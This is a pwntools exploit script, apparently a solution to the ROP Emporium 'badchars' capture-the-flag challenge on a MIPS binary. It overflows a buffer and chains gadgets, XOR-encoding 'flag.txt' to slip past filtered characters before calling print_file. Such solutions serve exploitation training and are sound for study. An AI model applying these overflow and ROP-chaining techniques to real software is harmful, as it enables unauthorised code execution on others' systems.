from pwn import *

context(arch="mips",endian="little")

elf = ELF("./badchars_mipsel")

usefulGadgets1 = 0x400930 # lw t9,12(sp); lw t0,8(sp); lw t1,4(sp); sw t1,0(t0); jalr t9; addi sp,sp,16;
usefulGadgets2 = 0x400948 # lw t9,12(sp); lw t0,8(sp); lw t1,4(sp); lw t2,0(t1); xor t0,t0,t2; sw t0,0(t1); jalr t9; addi sp,sp,16;
usefulGadgets3 = 0x400968 # lw a0,8(sp); lw t9,4(sp); jalr t9; addi sp,sp,12;
print_file_plt = 0x400ab0
write_addr = 0x411000
nonexistent_addr = 0x400b30

#p = gdb.debug(elf.path,'''
#        break *pwnme + 444
#        continue
#''')

p = process(elf.path)

p.recvuntil("> ")
buf = b'A' * 36
buf += p32(usefulGadgets1)
buf += b'S' * 4
buf += b'FLAG' # t1 # 'flag' ^ 32
buf += p32(write_addr)
buf += p32(usefulGadgets2)
buf += b'S' * 4
buf += p32(write_addr) # t1
buf += b'\x20\x20\x20\x20' # t0
buf += p32(usefulGadgets1) # t9
buf += b'S' * 4

buf += b'\x0eTXT' # t1 # '.txt' ^ 32
buf += p32(write_addr+4)
buf += p32(usefulGadgets2)
buf += b'S' * 4
buf += p32(write_addr+4) # t1
buf += b'\x20\x20\x20\x20' # t0
buf += p32(usefulGadgets3) # t9
buf += b'S' * 4
buf += p32(print_file_plt)
buf += p32(write_addr)

p.send(buf)

p.interactive()
